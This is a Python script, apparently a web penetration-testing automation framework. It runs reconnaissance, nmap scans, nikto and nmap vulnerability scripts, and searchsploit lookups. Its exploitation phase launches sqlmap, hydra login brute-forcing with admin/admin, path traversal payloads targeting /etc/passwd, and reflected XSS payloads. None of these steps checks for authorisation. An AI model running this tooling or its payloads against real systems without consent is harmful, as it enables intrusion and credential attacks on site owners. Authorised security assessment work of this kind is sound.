#!/usr/bin/env python3
"""
WebPenTest Automation Framework
===============================
Automated Web Penetration Testing Tool following OWASP/PTES/NIST methodologies
Author: Security Team
Version: 1.0
"""

import subprocess
import json
import time
import re
import os
import sys
import urllib.parse
import argparse
from datetime import datetime
from pathlib import Path
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor
import socket
import ssl
import requests
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Colors:
    """ANSI color codes for terminal output"""
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


class WebPenTestFramework:
    def __init__(self, target, output_dir="pentest_results"):
        self.target = self.normalize_target(target)
        self.domain = self.extract_domain(self.target)
        self.output_dir = Path(output_dir) / f"scan_{self.domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self.output_dir.mkdir(parents=True, exist_ok=True)

        # Results storage
        self.results = {
            'target': self.target,
            'domain': self.domain,
            'start_time': datetime.now().isoformat(),
            'reconnaissance': {},
            'scanning': {},
            'vulnerabilities': [],
            'exploited': [],
            'recommendations': []
        }

        # Tool paths and availability
        self.tools = self.check_tools()

        print(f"{Colors.HEADER}[+] WebPenTest Framework Initialized{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[+] Target: {self.target}{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[+] Output Directory: {self.output_dir}{Colors.ENDC}")

    def normalize_target(self, target):
        """Normalize target URL/IP"""
        if not target.startswith(('http://', 'https://')):
            if self.is_ip(target):
                return f"http://{target}"
            else:
                return f"https://{target}"
        return target

    def is_ip(self, target):
        """Check if target is an IP address"""
        try:
            socket.inet_aton(target.split(':')[0])
            return True
        except:
            return False

    def extract_domain(self, url):
        """Extract domain from URL"""
        parsed = urllib.parse.urlparse(url)
        return parsed.netloc.split(':')[0]

    def check_tools(self):
        """Check availability of required tools"""
        tools = {
            'nmap': self.check_tool('nmap'),
            'gobuster': self.check_tool('gobuster'),
            'nikto': self.check_tool('nikto'),
            'sqlmap': self.check_tool('sqlmap'),
            'hydra': self.check_tool('hydra'),
            'whatweb': self.check_tool('whatweb'),
            'wfuzz': self.check_tool('wfuzz'),
            'dirb': self.check_tool('dirb'),
            'dnsrecon': self.check_tool('dnsrecon'),
            'theharvester': self.check_tool('theharvester'),
            'searchsploit': self.check_tool('searchsploit'),
            'wafw00f': self.check_tool('wafw00f'),
            'sslyze': self.check_tool('sslyze')
        }

        missing = [tool for tool, available in tools.items() if not available]
        if missing:
            print(f"{Colors.WARNING}[!] Missing tools: {', '.join(missing)}{Colors.ENDC}")
            print(f"{Colors.WARNING}[!] Install missing tools: sudo apt install {' '.join(missing)}{Colors.ENDC}")

        return tools

    def check_tool(self, tool):
        """Check if tool is available"""
        try:
            subprocess.run([tool, '--help'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        except FileNotFoundError:
            return False

    def run_command(self, command, timeout=300):
        """Execute shell command with error handling"""
        try:
            print(f"{Colors.OKCYAN}[*] Running: {' '.join(command)}{Colors.ENDC}")
            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                timeout=timeout,
                check=False
            )
            return result
        except subprocess.TimeoutExpired:
            print(f"{Colors.FAIL}[!] Command timed out: {' '.join(command)}{Colors.ENDC}")
            return None
        except Exception as e:
            print(f"{Colors.FAIL}[!] Error running command: {e}{Colors.ENDC}")
            return None

    def save_output(self, filename, content):
        """Save output to file"""
        filepath = self.output_dir / filename
        with open(filepath, 'w') as f:
            f.write(content)
        return filepath

    def phase_1_reconnaissance(self):
        """Phase 1: Reconnaissance and Information Gathering"""
        print(f"\n{Colors.HEADER}=== PHASE 1: RECONNAISSANCE ==={Colors.ENDC}")

        # DNS Reconnaissance
        self.dns_reconnaissance()

        # Technology Detection
        self.technology_detection()

        # The Harvester - Email/subdomain gathering
        self.harvester_scan()

        # SSL/TLS Analysis
        self.ssl_analysis()

        # WAF Detection
        self.waf_detection()

    def dns_reconnaissance(self):
        """DNS reconnaissance and subdomain enumeration"""
        print(f"{Colors.OKGREEN}[+] Starting DNS Reconnaissance{Colors.ENDC}")

        if self.tools['dnsrecon']:
            # DNSRecon
            cmd = ['dnsrecon', '-d', self.domain, '-t', 'std']
            result = self.run_command(cmd)
            if result:
                self.save_output('dnsrecon.txt', result.stdout)
                self.results['reconnaissance']['dns'] = result.stdout

        # Manual DNS queries
        dns_info = self.manual_dns_queries()
        self.results['reconnaissance']['dns_manual'] = dns_info

    def manual_dns_queries(self):
        """Manual DNS queries"""
        dns_info = {}
        records = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME']

        for record_type in records:
            try:
                cmd = ['dig', '+short', self.domain, record_type]
                result = self.run_command(cmd, timeout=30)
                if result and result.stdout.strip():
                    dns_info[record_type] = result.stdout.strip().split('\n')
            except:
                pass

        return dns_info

    def technology_detection(self):
        """Detect web technologies"""
        print(f"{Colors.OKGREEN}[+] Detecting Web Technologies{Colors.ENDC}")

        if self.tools['whatweb']:
            cmd = ['whatweb', '-v', '-a', '3', self.target]
            result = self.run_command(cmd)
            if result:
                self.save_output('whatweb.txt', result.stdout)
                self.results['reconnaissance']['technologies'] = result.stdout

    def harvester_scan(self):
        """Email and subdomain harvesting"""
        print(f"{Colors.OKGREEN}[+] Email and Subdomain Harvesting{Colors.ENDC}")

        if self.tools['theharvester']:
            sources = ['google', 'bing', 'duckduckgo', 'yahoo']
            for source in sources:
                cmd = ['theharvester', '-d', self.domain, '-b', source, '-l', '500']
                result = self.run_command(cmd, timeout=60)
                if result:
                    self.save_output(f'harvester_{source}.txt', result.stdout)

    def ssl_analysis(self):
        """SSL/TLS certificate analysis"""
        print(f"{Colors.OKGREEN}[+] SSL/TLS Analysis{Colors.ENDC}")

        if self.target.startswith('https://'):
            if self.tools['sslyze']:
                cmd = ['sslyze', '--regular', self.domain]
                result = self.run_command(cmd)
                if result:
                    self.save_output('sslyze.txt', result.stdout)
                    self.results['reconnaissance']['ssl'] = result.stdout

    def waf_detection(self):
        """Web Application Firewall detection"""
        print(f"{Colors.OKGREEN}[+] WAF Detection{Colors.ENDC}")

        if self.tools['wafw00f']:
            cmd = ['wafw00f', self.target]
            result = self.run_command(cmd)
            if result:
                self.save_output('wafw00f.txt', result.stdout)
                self.results['reconnaissance']['waf'] = result.stdout

    def phase_2_scanning(self):
        """Phase 2: Scanning and Enumeration"""
        print(f"\n{Colors.HEADER}=== PHASE 2: SCANNING ==={Colors.ENDC}")

        # Port Scanning
        open_ports = self.port_scanning()

        # Directory and File Enumeration
        directories = self.directory_enumeration()

        # Service Version Detection
        self.service_detection(open_ports)

        return open_ports, directories

    def port_scanning(self):
        """Comprehensive port scanning"""
        print(f"{Colors.OKGREEN}[+] Port Scanning{Colors.ENDC}")

        open_ports = []

        if self.tools['nmap']:
            # Quick scan for common ports
            cmd = ['nmap', '-sS', '-T4', '--top-ports', '1000', self.domain]
            result = self.run_command(cmd, timeout=300)
            if result:
                self.save_output('nmap_quick.txt', result.stdout)
                open_ports.extend(self.parse_nmap_ports(result.stdout))

            # Full TCP scan if target responds
            if open_ports:
                cmd = ['nmap', '-sS', '-T4', '-p-', self.domain]
                result = self.run_command(cmd, timeout=1800)  # 30 minutes max
                if result:
                    self.save_output('nmap_full.txt', result.stdout)
                    open_ports = self.parse_nmap_ports(result.stdout)

            # UDP scan for common ports
            cmd = ['nmap', '-sU', '--top-ports', '100', self.domain]
            result = self.run_command(cmd, timeout=600)
            if result:
                self.save_output('nmap_udp.txt', result.stdout)

        self.results['scanning']['ports'] = open_ports
        return open_ports

    def parse_nmap_ports(self, nmap_output):
        """Parse open ports from nmap output"""
        ports = []
        for line in nmap_output.split('\n'):
            if '/tcp' in line and 'open' in line:
                port = line.split('/')[0]
                if port.isdigit():
                    ports.append(int(port))
        return ports

    def directory_enumeration(self):
        """Directory and file enumeration"""
        print(f"{Colors.OKGREEN}[+] Directory Enumeration{Colors.ENDC}")

        directories = []
        wordlists = [
            '/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt',
            '/usr/share/wordlists/dirb/common.txt',
            '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt'
        ]

        # Find available wordlist
        wordlist = None
        for wl in wordlists:
            if os.path.exists(wl):
                wordlist = wl
                break

        if not wordlist:
            print(f"{Colors.WARNING}[!] No wordlist found for directory enumeration{Colors.ENDC}")
            return directories

        # Gobuster scan
        if self.tools['gobuster']:
            cmd = ['gobuster', 'dir', '-u', self.target, '-w', wordlist, '-t', '50', '-x',
                   'php,html,txt,js,asp,aspx,jsp']
            result = self.run_command(cmd, timeout=600)
            if result:
                self.save_output('gobuster.txt', result.stdout)
                directories.extend(self.parse_gobuster_output(result.stdout))

        # DIRB scan as backup
        elif self.tools['dirb']:
            cmd = ['dirb', self.target, wordlist, '-S']
            result = self.run_command(cmd, timeout=600)
            if result:
                self.save_output('dirb.txt', result.stdout)

        self.results['scanning']['directories'] = directories
        return directories

    def parse_gobuster_output(self, output):
        """Parse directories from gobuster output"""
        directories = []
        for line in output.split('\n'):
            if line.startswith('/') and '(Status:' in line:
                path = line.split(' ')[0]
                directories.append(path)
        return directories

    def service_detection(self, open_ports):
        """Service version detection"""
        print(f"{Colors.OKGREEN}[+] Service Version Detection{Colors.ENDC}")

        if self.tools['nmap'] and open_ports:
            ports_str = ','.join(map(str, open_ports[:50]))  # Limit to first 50 ports
            cmd = ['nmap', '-sV', '-sC', '-p', ports_str, self.domain]
            result = self.run_command(cmd, timeout=600)
            if result:
                self.save_output('nmap_services.txt', result.stdout)
                self.results['scanning']['services'] = result.stdout

    def phase_3_vulnerability_assessment(self):
        """Phase 3: Vulnerability Assessment"""
        print(f"\n{Colors.HEADER}=== PHASE 3: VULNERABILITY ASSESSMENT ==={Colors.ENDC}")

        # Web vulnerability scanning
        self.web_vulnerability_scan()

        # Nmap script scanning
        self.nmap_script_scan()

        # Search for exploits
        self.exploit_search()

    def web_vulnerability_scan(self):
        """Web application vulnerability scanning"""
        print(f"{Colors.OKGREEN}[+] Web Vulnerability Scanning{Colors.ENDC}")

        # Nikto scan
        if self.tools['nikto']:
            cmd = ['nikto', '-h', self.target, '-Format', 'txt']
            result = self.run_command(cmd, timeout=600)
            if result:
                self.save_output('nikto.txt', result.stdout)
                vulnerabilities = self.parse_nikto_vulns(result.stdout)
                self.results['vulnerabilities'].extend(vulnerabilities)

    def parse_nikto_vulns(self, nikto_output):
        """Parse vulnerabilities from Nikto output"""
        vulnerabilities = []
        for line in nikto_output.split('\n'):
            if '+ ' in line and any(keyword in line.lower() for keyword in
                                    ['vulnerability', 'cve', 'exploit', 'injection', 'xss', 'outdated']):
                vuln = {
                    'tool': 'nikto',
                    'type': 'web_vulnerability',
                    'description': line.strip(),
                    'severity': self.assess_severity(line)
                }
                vulnerabilities.append(vuln)
        return vulnerabilities

    def nmap_script_scan(self):
        """Nmap script scan for vulnerabilities"""
        print(f"{Colors.OKGREEN}[+] Nmap Script Scanning{Colors.ENDC}")

        if self.tools['nmap']:
            # Vulnerability detection scripts
            cmd = ['nmap', '--script', 'vuln', self.domain]
            result = self.run_command(cmd, timeout=600)
            if result:
                self.save_output('nmap_vuln_scripts.txt', result.stdout)
                vulnerabilities = self.parse_nmap_vulns(result.stdout)
                self.results['vulnerabilities'].extend(vulnerabilities)

    def parse_nmap_vulns(self, nmap_output):
        """Parse vulnerabilities from Nmap script output"""
        vulnerabilities = []
        current_vuln = None

        for line in nmap_output.split('\n'):
            if 'VULNERABLE:' in line or 'CVE-' in line:
                if current_vuln:
                    vulnerabilities.append(current_vuln)

                current_vuln = {
                    'tool': 'nmap',
                    'type': 'infrastructure_vulnerability',
                    'description': line.strip(),
                    'severity': self.assess_severity(line)
                }
            elif current_vuln and line.strip().startswith('|'):
                current_vuln['description'] += '\n' + line.strip()

        if current_vuln:
            vulnerabilities.append(current_vuln)

        return vulnerabilities

    def exploit_search(self):
        """Search for available exploits"""
        print(f"{Colors.OKGREEN}[+] Searching for Exploits{Colors.ENDC}")

        if self.tools['searchsploit']:
            # Search based on identified technologies
            tech_keywords = self.extract_technology_keywords()

            for keyword in tech_keywords:
                cmd = ['searchsploit', keyword]
                result = self.run_command(cmd, timeout=60)
                if result and result.stdout.strip():
                    self.save_output(f'searchsploit_{keyword.replace(" ", "_")}.txt', result.stdout)

    def extract_technology_keywords(self):
        """Extract technology keywords for exploit search"""
        keywords = []
        if 'technologies' in self.results['reconnaissance']:
            tech_output = self.results['reconnaissance']['technologies']
            # Simple regex to extract common technologies
            patterns = [
                r'Apache[/\s]([0-9\.]+)',
                r'nginx[/\s]([0-9\.]+)',
                r'PHP[/\s]([0-9\.]+)',
                r'WordPress[/\s]([0-9\.]+)',
                r'MySQL[/\s]([0-9\.]+)'
            ]

            for pattern in patterns:
                matches = re.findall(pattern, tech_output, re.IGNORECASE)
                for match in matches:
                    keywords.append(f"{pattern.split('[')[0]} {match}")

        return keywords[:10]  # Limit to 10 keywords

    def assess_severity(self, description):
        """Assess vulnerability severity based on description"""
        critical_keywords = ['remote code execution', 'rce', 'buffer overflow', 'privilege escalation']
        high_keywords = ['sql injection', 'xss', 'csrf', 'path traversal', 'file inclusion']
        medium_keywords = ['information disclosure', 'session', 'authentication bypass']

        desc_lower = description.lower()

        if any(keyword in desc_lower for keyword in critical_keywords):
            return 'critical'
        elif any(keyword in desc_lower for keyword in high_keywords):
            return 'high'
        elif any(keyword in desc_lower for keyword in medium_keywords):
            return 'medium'
        else:
            return 'low'

    def phase_4_exploitation(self):
        """Phase 4: Exploitation"""
        print(f"\n{Colors.HEADER}=== PHASE 4: EXPLOITATION ==={Colors.ENDC}")

        # SQL Injection testing
        self.sql_injection_test()

        # Brute force attacks
        self.brute_force_attacks()

        # Custom exploits based on found vulnerabilities
        self.custom_exploitation()

    def sql_injection_test(self):
        """SQL injection testing"""
        print(f"{Colors.OKGREEN}[+] SQL Injection Testing{Colors.ENDC}")

        if self.tools['sqlmap']:
            # Test main URL
            cmd = ['sqlmap', '-u', self.target, '--batch', '--risk', '2', '--level', '3']
            result = self.run_command(cmd, timeout=600)
            if result:
                self.save_output('sqlmap.txt', result.stdout)
                if 'vulnerable' in result.stdout.lower():
                    exploit = {
                        'type': 'sql_injection',
                        'target': self.target,
                        'tool': 'sqlmap',
                        'status': 'successful',
                        'details': result.stdout
                    }
                    self.results['exploited'].append(exploit)

    def brute_force_attacks(self):
        """Brute force attacks on discovered services"""
        print(f"{Colors.OKGREEN}[+] Brute Force Attacks{Colors.ENDC}")

        if self.tools['hydra']:
            # Common login pages
            login_paths = ['/login', '/admin', '/wp-admin', '/administrator']

            for path in login_paths:
                target_url = f"{self.target.rstrip('/')}{path}"
                # Quick test with common credentials
                cmd = ['hydra', '-l', 'admin', '-p', 'admin', target_url, 'http-post-form',
                       'username=^USER^&password=^PASS^:F=failed:H=Cookie']
                result = self.run_command(cmd, timeout=300)
                if result:
                    self.save_output(f'hydra_{path.replace("/", "_")}.txt', result.stdout)

    def custom_exploitation(self):
        """Custom exploitation based on found vulnerabilities"""
        print(f"{Colors.OKGREEN}[+] Custom Exploitation{Colors.ENDC}")

        # Test for common vulnerabilities
        self.test_path_traversal()
        self.test_file_upload()
        self.test_xss()

    def test_path_traversal(self):
        """Test for path traversal vulnerabilities"""
        payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '/etc/passwd',
            'C:\\windows\\system32\\drivers\\etc\\hosts'
        ]

        for payload in payloads:
            try:
                response = requests.get(f"{self.target}?file={payload}",
                                        verify=False, timeout=10)
                if 'root:' in response.text or 'administrator' in response.text.lower():
                    exploit = {
                        'type': 'path_traversal',
                        'target': f"{self.target}?file={payload}",
                        'status': 'successful',
                        'details': f"Path traversal successful with payload: {payload}"
                    }
                    self.results['exploited'].append(exploit)
                    break
            except:
                pass

    def test_file_upload(self):
        """Test for file upload vulnerabilities"""
        # Simple test for file upload endpoints
        upload_paths = ['/upload', '/upload.php', '/fileupload', '/admin/upload']

        for path in upload_paths:
            try:
                response = requests.get(f"{self.target.rstrip('/')}{path}",
                                        verify=False, timeout=10)
                if response.status_code == 200 and 'upload' in response.text.lower():
                    # Found potential upload functionality
                    print(f"{Colors.WARNING}[!] Potential file upload found: {path}{Colors.ENDC}")
            except:
                pass

    def test_xss(self):
        """Test for XSS vulnerabilities"""
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            '\'-alert("XSS")-\'',
            'javascript:alert("XSS")'
        ]

        # Test query parameters
        for payload in xss_payloads:
            try:
                response = requests.get(f"{self.target}?search={payload}",
                                        verify=False, timeout=10)
                if payload in response.text:
                    exploit = {
                        'type': 'xss',
                        'target': f"{self.target}?search={payload}",
                        'status': 'potential',
                        'details': f"Reflected XSS potential with payload: {payload}"
                    }
                    self.results['exploited'].append(exploit)
                    break
            except:
                pass

    def phase_5_reporting(self):
        """Phase 5: Reporting"""
        print(f"\n{Colors.HEADER}=== PHASE 5: REPORTING ==={Colors.ENDC}")

        self.results['end_time'] = datetime.now().isoformat()
        self.generate_report()

    def generate_report(self):
        """Generate comprehensive penetration testing report"""
        print(f"{Colors.OKGREEN}[+] Generating Report{Colors.ENDC}")

        # Save JSON results
        json_report = self.output_dir / 'results.json'
        with open(json_report, 'w') as f:
            json.dump(self.results, f, indent=2)

        # Generate HTML report
        self.generate_html_report()

        # Generate executive summary
        self.generate_executive_summary()

    def generate_html_report(self):
        """Generate HTML report"""
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Penetration Test Report - {self.domain}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        .header {{ background-color: #f4f4f4; padding: 20px; border-radius: 5px; }}
        .critical {{ color: #d32f2f; font-weight: bold; }}
        .high {{ color: #f57c00; font-weight: bold; }}
        .medium {{ color: #fbc02d; font-weight: bold; }}
        .low {{ color: #388e3c; font-weight: bold; }}
        .section {{ margin: 20px 0; padding: 15px; border-left: 4px solid #2196f3; }}
        .vulnerability {{ margin: 10px 0; padding: 10px; background-color: #f9f9f9; border-radius: 3px; }}
        .exploit {{ margin: 10px 0; padding: 10px; background-color: #ffebee; border-radius: 3px; border-left: 4px solid #d32f2f; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>Penetration Test Report</h1>
        <p><strong>Target:</strong> {self.target}</p>
        <p><strong>Domain:</strong> {self.domain}</p>
        <p><strong>Test Date:</strong> {self.results['start_time']}</p>
        <p><strong>Report Generated:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    </div>

    <div class="section">
        <h2>Executive Summary</h2>
        <p>This penetration test was conducted against {self.domain} following industry-standard methodologies 
        including OWASP, PTES, and NIST guidelines.</p>

        <h3>Vulnerability Summary</h3>
        <ul>
            <li>Critical: {len([v for v in self.results['vulnerabilities'] if v.get('severity') == 'critical'])}</li>
            <li>High: {len([v for v in self.results['vulnerabilities'] if v.get('severity') == 'high'])}</li>
            <li>Medium: {len([v for v in self.results['vulnerabilities'] if v.get('severity') == 'medium'])}</li>
            <li>Low: {len([v for v in self.results['vulnerabilities'] if v.get('severity') == 'low'])}</li>
        </ul>

        <h3>Successful Exploits</h3>
        <p>Successfully exploited vulnerabilities: {len(self.results['exploited'])}</p>
    </div>

    <div class="section">
        <h2>Technical Findings</h2>

        <h3>Discovered Vulnerabilities</h3>
        {self.format_vulnerabilities_html()}

        <h3>Successfully Exploited</h3>
        {self.format_exploits_html()}
    </div>

    <div class="section">
        <h2>Recommendations</h2>
        {self.generate_recommendations_html()}
    </div>

    <div class="section">
        <h2>Detailed Technical Data</h2>
        <p>For detailed technical output, please refer to the individual tool outputs in the results directory:</p>
        <ul>
            {self.list_output_files_html()}
        </ul>
    </div>
</body>
</html>
        """

        html_report = self.output_dir / 'report.html'
        with open(html_report, 'w') as f:
            f.write(html_content)

        print(f"{Colors.OKGREEN}[+] HTML Report saved: {html_report}{Colors.ENDC}")

    def format_vulnerabilities_html(self):
        """Format vulnerabilities for HTML report"""
        if not self.results['vulnerabilities']:
            return "<p>No vulnerabilities detected by automated tools.</p>"

        html = ""
        for vuln in self.results['vulnerabilities']:
            severity_class = vuln.get('severity', 'low')
            html += f"""
            <div class="vulnerability">
                <p><span class="{severity_class}">[{vuln.get('severity', 'UNKNOWN').upper()}]</span> 
                <strong>{vuln.get('type', 'Unknown')}</strong> - {vuln.get('tool', 'Unknown tool')}</p>
                <p>{vuln.get('description', 'No description available')}</p>
            </div>
            """
        return html

    def format_exploits_html(self):
        """Format successful exploits for HTML report"""
        if not self.results['exploited']:
            return "<p>No vulnerabilities were successfully exploited during the test.</p>"

        html = ""
        for exploit in self.results['exploited']:
            html += f"""
            <div class="exploit">
                <p><strong>{exploit.get('type', 'Unknown').upper()}</strong> - Status: {exploit.get('status', 'Unknown')}</p>
                <p><strong>Target:</strong> {exploit.get('target', 'Unknown')}</p>
                <p><strong>Details:</strong> {exploit.get('details', 'No details available')}</p>
            </div>
            """
        return html

    def generate_recommendations_html(self):
        """Generate recommendations based on findings"""
        recommendations = []

        # Based on vulnerabilities found
        vuln_types = [v.get('type') for v in self.results['vulnerabilities']]

        if any('sql' in vtype.lower() for vtype in vuln_types):
            recommendations.append(
                "Implement proper input validation and parameterized queries to prevent SQL injection.")

        if any('xss' in vtype.lower() for vtype in vuln_types):
            recommendations.append(
                "Implement proper output encoding and Content Security Policy to prevent XSS attacks.")

        if any('path' in vtype.lower() for vtype in vuln_types):
            recommendations.append(
                "Implement proper input validation and access controls to prevent path traversal attacks.")

        # General recommendations
        recommendations.extend([
            "Keep all software and frameworks up to date with the latest security patches.",
            "Implement a Web Application Firewall (WAF) to filter malicious requests.",
            "Conduct regular security assessments and penetration testing.",
            "Implement proper authentication and authorization mechanisms.",
            "Use HTTPS for all communications and properly configure SSL/TLS.",
            "Implement proper logging and monitoring for security events."
        ])

        html = "<ul>"
        for rec in recommendations:
            html += f"<li>{rec}</li>"
        html += "</ul>"

        return html

    def list_output_files_html(self):
        """List output files for HTML report"""
        files = list(self.output_dir.glob('*.txt'))
        html = ""
        for file in files:
            html += f"<li>{file.name}</li>"
        return html

    def generate_executive_summary(self):
        """Generate executive summary"""
        summary = f"""
PENETRATION TEST EXECUTIVE SUMMARY
==================================

Target: {self.target}
Domain: {self.domain}
Test Date: {self.results['start_time']}

OVERVIEW:
A comprehensive penetration test was conducted against {self.domain} following industry-standard 
methodologies including OWASP Web Security Testing Guide, PTES, and NIST SP 800-115.

VULNERABILITY SUMMARY:
- Critical: {len([v for v in self.results['vulnerabilities'] if v.get('severity') == 'critical'])}
- High: {len([v for v in self.results['vulnerabilities'] if v.get('severity') == 'high'])}
- Medium: {len([v for v in self.results['vulnerabilities'] if v.get('severity') == 'medium'])}
- Low: {len([v for v in self.results['vulnerabilities'] if v.get('severity') == 'low'])}

SUCCESSFUL EXPLOITS: {len(self.results['exploited'])}

RISK ASSESSMENT:
{self.calculate_risk_level()}

IMMEDIATE ACTIONS REQUIRED:
{self.get_immediate_actions()}

For detailed technical information, please refer to the full report and individual tool outputs.
        """

        summary_file = self.output_dir / 'executive_summary.txt'
        with open(summary_file, 'w') as f:
            f.write(summary)

        print(f"{Colors.OKGREEN}[+] Executive Summary saved: {summary_file}{Colors.ENDC}")

    def calculate_risk_level(self):
        """Calculate overall risk level"""
        critical_count = len([v for v in self.results['vulnerabilities'] if v.get('severity') == 'critical'])
        high_count = len([v for v in self.results['vulnerabilities'] if v.get('severity') == 'high'])
        exploited_count = len(self.results['exploited'])

        if critical_count > 0 or exploited_count > 0:
            return "CRITICAL - Immediate action required"
        elif high_count > 2:
            return "HIGH - Action required within 30 days"
        elif high_count > 0:
            return "MEDIUM - Action required within 90 days"
        else:
            return "LOW - Monitor and maintain current security posture"

    def get_immediate_actions(self):
        """Get immediate actions based on findings"""
        actions = []

        if any(e.get('type') == 'sql_injection' for e in self.results['exploited']):
            actions.append("- URGENT: Patch SQL injection vulnerabilities immediately")

        if any(v.get('severity') == 'critical' for v in self.results['vulnerabilities']):
            actions.append("- Address all critical vulnerabilities within 24-48 hours")

        if not actions:
            actions.append("- Continue monitoring and maintain current security measures")

        return '\n'.join(actions)

    def run_full_pentest(self):
        """Run complete penetration test"""
        try:
            print(f"{Colors.BOLD}Starting Full Penetration Test{Colors.ENDC}")
            print(f"Target: {self.target}")
            print(f"Start Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

            # Phase 1: Reconnaissance
            self.phase_1_reconnaissance()

            # Phase 2: Scanning
            open_ports, directories = self.phase_2_scanning()

            # Phase 3: Vulnerability Assessment
            self.phase_3_vulnerability_assessment()

            # Phase 4: Exploitation (only if vulnerabilities found)
            if self.results['vulnerabilities']:
                self.phase_4_exploitation()
            else:
                print(f"{Colors.WARNING}[!] No vulnerabilities found for exploitation{Colors.ENDC}")

            # Phase 5: Reporting
            self.phase_5_reporting()

            print(f"\n{Colors.OKGREEN}[+] Penetration Test Completed Successfully{Colors.ENDC}")
            print(f"{Colors.OKGREEN}[+] Results saved in: {self.output_dir}{Colors.ENDC}")
            print(
                f"{Colors.OKGREEN}[+] Total vulnerabilities found: {len(self.results['vulnerabilities'])}{Colors.ENDC}")
            print(f"{Colors.OKGREEN}[+] Successful exploits: {len(self.results['exploited'])}{Colors.ENDC}")

        except KeyboardInterrupt:
            print(f"\n{Colors.WARNING}[!] Test interrupted by user{Colors.ENDC}")
            self.phase_5_reporting()
        except Exception as e:
            print(f"\n{Colors.FAIL}[!] Error during penetration test: {e}{Colors.ENDC}")
            self.phase_5_reporting()


def main():
    parser = argparse.ArgumentParser(
        description='WebPenTest Automation Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 webpentest.py -t https://example.com
  python3 webpentest.py -t 192.168.1.100 -o /tmp/results
  python3 webpentest.py -t example.com -v
        """
    )

    parser.add_argument('-t', '--target', required=True,
                        help='Target URL or IP address')
    parser.add_argument('-o', '--output', default='pentest_results',
                        help='Output directory (default: pentest_results)')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Verbose output')

    args = parser.parse_args()

    if args.verbose:
        print(f"{Colors.OKBLUE}[*] Verbose mode enabled{Colors.ENDC}")

    # Check if running as root (recommended for some tools)
    if os.geteuid() != 0:
        print(f"{Colors.WARNING}[!] Not running as root. Some tools may not work properly.{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] Consider running with sudo for full functionality.{Colors.ENDC}")

    # Initialize and run framework
    framework = WebPenTestFramework(args.target, args.output)
    framework.run_full_pentest()


if __name__ == "__main__":
    main()